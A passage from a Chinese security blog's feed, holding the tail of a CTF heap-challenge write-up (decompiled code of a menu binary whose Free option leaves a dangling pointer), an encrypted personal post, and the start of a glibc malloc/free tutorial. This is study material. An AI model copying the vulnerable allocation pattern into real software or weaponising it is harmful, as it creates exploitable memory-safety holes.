PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro-5"><a href="#IDA-Pro-5" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h4><h5 id="main-1"><a href="#main-1" class="headerlink" title="main:"></a>main:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  sub_401304(a1, a2, a3);<span class="hljs-comment">//第一个是整型数据，后面两个是指向指针的指针</span><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      sub_4016EB();<span class="hljs-comment">//打印菜单</span><br>      v3 = (<span class="hljs-type">int</span>)sub_401276();<span class="hljs-comment">//接受输入的字符串返回为长整型</span><br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      sub_4015E3();<span class="hljs-comment">//v3等于2</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>      &#123;<br>        sub_401672();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>          _exit(<span class="hljs-number">0</span>);<br>LABEL_13:<br>        sub_4012D1(<span class="hljs-string">&quot;Invalid choice\n&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      sub_401507();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sub-401304"><a href="#sub-401304" class="headerlink" title="sub_401304:"></a>sub_401304:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub_401304</span><span class="hljs-params">()</span><span class="hljs-comment">//感觉类似于某种初始化</span><br>&#123;<br>  __int16 v1; <span class="hljs-comment">// [rsp+0h] [rbp-60h] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [rsp+8h] [rbp-58h]</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-50h] BYREF</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [rsp+1Ch] [rbp-44h] BYREF</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">20</span>]; <span class="hljs-comment">// [rsp+28h] [rbp-38h] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">28</span>]; <span class="hljs-comment">// [rsp+3Ch] [rbp-24h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<span class="hljs-comment">//系统调用，用于控制进程属性</span><br>  <span class="hljs-built_in">strcpy</span>(v3, <span class="hljs-string">&quot; &quot;</span>);<span class="hljs-comment">//设置字符串v3为空格</span><br>  v3[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>  v3[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>  v3[<span class="hljs-number">4</span>] = <span class="hljs-number">4</span>;<br>  v3[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>  v3[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>  v3[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>  v3[<span class="hljs-number">8</span>] = <span class="hljs-number">21</span>;<br>  v3[<span class="hljs-number">9</span>] = <span class="hljs-number">0</span>;<br>  v3[<span class="hljs-number">10</span>] = <span class="hljs-number">0</span>;<br>  v3[<span class="hljs-number">11</span>] = <span class="hljs-number">6</span>;<br>  <span class="hljs-built_in">strcpy</span>(v4, <span class="hljs-string">&quot;&gt;&quot;</span>);<br>  v4[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>  v4[<span class="hljs-number">3</span>] = <span class="hljs-number">-64</span>;<br>  <span class="hljs-built_in">strcpy</span>(&amp;v4[<span class="hljs-number">4</span>], <span class="hljs-string">&quot; &quot;</span>);<br>  v4[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>  v4[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>  v4[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>  v4[<span class="hljs-number">9</span>] = <span class="hljs-number">0</span>;<br>  v4[<span class="hljs-number">10</span>] = <span class="hljs-number">0</span>;<br>  v4[<span class="hljs-number">11</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;%&quot;</span>);<br>  v5[<span class="hljs-number">2</span>] = <span class="hljs-number">4</span>;<br>  v5[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">7</span>] = <span class="hljs-number">64</span>;<br>  v5[<span class="hljs-number">8</span>] = <span class="hljs-number">21</span>;<br>  v5[<span class="hljs-number">9</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">10</span>] = <span class="hljs-number">3</span>;<br>  v5[<span class="hljs-number">11</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">12</span>] = <span class="hljs-number">3</span>;<br>  v5[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">16</span>] = <span class="hljs-number">21</span>;<br>  v5[<span class="hljs-number">17</span>] = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">18</span>] = <span class="hljs-number">2</span>;<br>  v5[<span class="hljs-number">19</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;;&quot;</span>);<br>  v6[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">4</span>] = <span class="hljs-number">21</span>;<br>  v6[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">6</span>] = <span class="hljs-number">1</span>;<br>  v6[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">8</span>] = <span class="hljs-number">66</span>;<br>  v6[<span class="hljs-number">9</span>] = <span class="hljs-number">1</span>;<br>  v6[<span class="hljs-number">10</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">11</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">12</span>] = <span class="hljs-number">6</span>;<br>  v6[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">17</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">18</span>] = <span class="hljs-number">-1</span>;<br>  v6[<span class="hljs-number">19</span>] = <span class="hljs-number">127</span>;<br>  v6[<span class="hljs-number">20</span>] = <span class="hljs-number">6</span>;<br>  v6[<span class="hljs-number">21</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">22</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">23</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">24</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">25</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">26</span>] = <span class="hljs-number">0</span>;<br>  v6[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br>  v1 = <span class="hljs-number">9</span>;<br>  v2 = v3;<br>  prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br>  <span class="hljs-keyword">return</span> alarm(<span class="hljs-number">0x20u</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sub-4016EB"><a href="#sub-4016EB" class="headerlink" title="sub_4016EB:"></a>sub_4016EB:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sub_4016EB</span><span class="hljs-params">()</span><span class="hljs-comment">//打印菜单</span><br>&#123;<br>  sub_4012D1(<span class="hljs-string">&quot;1.Add\n&quot;</span>);<br>  sub_4012D1(<span class="hljs-string">&quot;2.Edit\n&quot;</span>);<br>  sub_4012D1(<span class="hljs-string">&quot;3.Free\n&quot;</span>);<br>  sub_4012D1(<span class="hljs-string">&quot;4.Exit\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&gt;&gt; &quot;</span>, <span class="hljs-number">3uLL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sub-401276"><a href="#sub-401276" class="headerlink" title="sub_401276"></a>sub_401276</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_401276</span><span class="hljs-params">()</span><span class="hljs-comment">//接受输入的数字字符串并转化为长整型返回</span><br>&#123;<br>  __int64 buf[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  buf[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<span class="hljs-comment">//貌似存在一定的溢出长度但是应该不够用</span><br>  <span class="hljs-keyword">return</span> atol((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)buf);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sub-4015E3"><a href="#sub-4015E3" class="headerlink" title="sub_4015E3:"></a>sub_4015E3:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sub_4015E3</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  sub_4012D1(<span class="hljs-string">&quot;Idx:&quot;</span>);<span class="hljs-comment">//就是打印一个字符串，中间用了一下strlen函数</span><br>  v1 = sub_401276();<span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">4</span> &amp;&amp; *((_QWORD *)&amp;unk_4035A0 + v1) )<br>  &#123;<br>    sub_4012D1(<span class="hljs-string">&quot;Content: &quot;</span>);<br>    <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;unk_4035A0 + v1), <span class="hljs-number">0x20u</span>LL);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    sub_4012D1(<span class="hljs-string">&quot;Invalid idx\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sub-401672"><a href="#sub-401672" class="headerlink" title="sub_401672:"></a>sub_401672:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sub_401672</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  sub_4012D1(<span class="hljs-string">&quot;Idx:&quot;</span>);<br>  v0 = sub_401276();<br>  <span class="hljs-keyword">if</span> ( v0 &lt;= <span class="hljs-number">4</span> &amp;&amp; *((_QWORD *)&amp;unk_4035A0 + v0) )<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;unk_4035A0 + v0));<br>  <span class="hljs-keyword">else</span><br>    sub_4012D1(<span class="hljs-string">&quot;Invalid idx\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sub-4012D1"><a href="#sub-4012D1" class="headerlink" title="sub_4012D1:"></a>sub_4012D1:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">sub_4012D1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><span class="hljs-comment">//输出打印这个字符串，中间利用到了strlen函数</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// rax</span><br><br>  v1 = <span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, a1, v1);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sub-401507"><a href="#sub-401507" class="headerlink" title="sub_401507:"></a>sub_401507:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sub_401507</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">void</span> *v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  sub_4012D1(<span class="hljs-string">&quot;Size: &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)sub_401276() == <span class="hljs-number">32LL</span> )<br>  &#123;<br>    v2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20u</span>LL);<br>    <span class="hljs-keyword">if</span> ( v2 )<br>    &#123;<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">31</span>; ++i )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( !qword_4035A0[i] )<br>        &#123;<br>          sub_4012D1(<span class="hljs-string">&quot;Done!\n&quot;</span>);<br>          qword_4035A0[i] = v2;<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> sub_4012D1(<span class="hljs-string">&quot;empty&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      sub_4012D1(<span class="hljs-string">&quot;Error&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    sub_4012D1(<span class="hljs-string">&quot;Invalid size&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>Personal_wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>厨艺学习记录</title>
    <link href="/%E5%8E%A8%E8%89%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/%E5%8E%A8%E8%89%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="格式是年月日例如20250303." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="07168e59686632ab525e26b7afeeac8caebee423e74505a60e4e59e2ed23a4e2">c605a6a6a90cd74ffaacff13940df969dc6f60553fe0ebca32fa0ea3917fa5b9f8b676fc88bd27c9e940b70f7d349114a878297ef27a89e9b32d5bfef277af3a0e1c189f2018b27a0afb0e3f3c43622dc53b77b5354b62f9f957d3ac4e9255b4dd33478beb635b862817ca1d8061edfaa4dfc4ef38e7f22ad12c8f6b4d45d307fdefd2e0c8f71d035f33aa5487c1fdaf799d64c905936ac15685ad1e832f4a9d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是她的生日.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>生活</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆概述</title>
    <link href="/%E5%A0%86%E6%A6%82%E8%BF%B0/"/>
    <url>/%E5%A0%86%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h1><h3 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h3><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是<strong>程序虚拟地址空间的一块连续的线性区域</strong>，它由低地址向高地址方向增长。我们一般称<strong>管理堆的那部分程序为堆管理器</strong>。</p><p>堆管理器处于用户程序与内核中间，主要做以下工作：</p><ol><li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li><li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li></ol><p>Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是<strong>ptmalloc</strong>，在glibc-2.3.x. 之后，<strong>glibc 中集成了 ptmalloc2</strong>。</p><p><strong>ptmalloc2 主要是通过 malloc&#x2F;free 函数来分配和释放内存块。</strong></p><p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。<strong>只有当用户使用到相应的内存时</strong>，系统才会真正分配物理页面给用户使用。</p><h3 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h3><h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448">malloc.c</a> 中，malloc 的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  malloc(size_t n)</span><br><span class="hljs-comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="hljs-comment">  if no space is available. Additionally, on failure, errno is</span><br><span class="hljs-comment">  set to ENOMEM on ANSI C systems.</span><br><span class="hljs-comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="hljs-comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="hljs-comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="hljs-comment">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="hljs-comment">  of space, which will often fail. The maximum supported value of n</span><br><span class="hljs-comment">  differs across systems, but is in all cases less than the maximum</span><br><span class="hljs-comment">  representable value of a size_t.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>翻译：</p><p><strong><code>malloc(size_t n)</code></strong></p><p>该函数返回一个指向新分配的、至少为<code>n</code>字节大小的内存块的指针；如果无法分配空间，则返回<code>NULL</code>。此外，在ANSI C系统中，如果分配失败，<code>errno</code>会被设置为<code>ENOMEM</code>。</p><p>如果<code>n</code>为零，<code>malloc</code>会返回一个最小尺寸的内存块（在大多数32位系统上，最小尺寸为16字节；在64位系统上，最小尺寸通常为24字节或32字节）。在大多数系统中，<code>size_t</code>是一种无符号类型，因此带有负参数的调用会被解释为请求大量空间，这通常会失败。<code>n</code>的最大支持值因系统而异，但在所有情况下都小于<code>size_t</code>能表示的最大值。</p><ul><li>当 n&#x3D;0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><p>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465">malloc.c</a> 中，free 的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">      free(void* p)</span><br><span class="hljs-comment">      Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="hljs-comment">      allocated using malloc or a related routine such as realloc.</span><br><span class="hljs-comment">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="hljs-comment">      effects if p has already been freed.</span><br><span class="hljs-comment">      Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="hljs-comment">      when possible, automatically trigger operations that give</span><br><span class="hljs-comment">      back unused memory to the system, thus reducing program footprint.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>翻译：</p><p><strong><code>free(void\* p)</code></strong></p><p>释放由指针<code>p</code>指向的内存块，该内存块之前是通过<code>malloc</code>或类似函数（如<code>realloc</code>）分配的。<br>如果<code>p</code>为<code>NULL</code>，则该函数没有任何效果。<br>如果<code>p</code>已经被释放过，则可能会产生任意的（即，糟糕的！）效果。<br>除非通过<code>mallopt</code>禁用，否则释放非常大的内存空间时，会尽可能自动触发操作，将未使用的内存归还给系统，从而减少程序的内存占用。</p><p>其中比较重要的就是：</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间</li></ul><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" 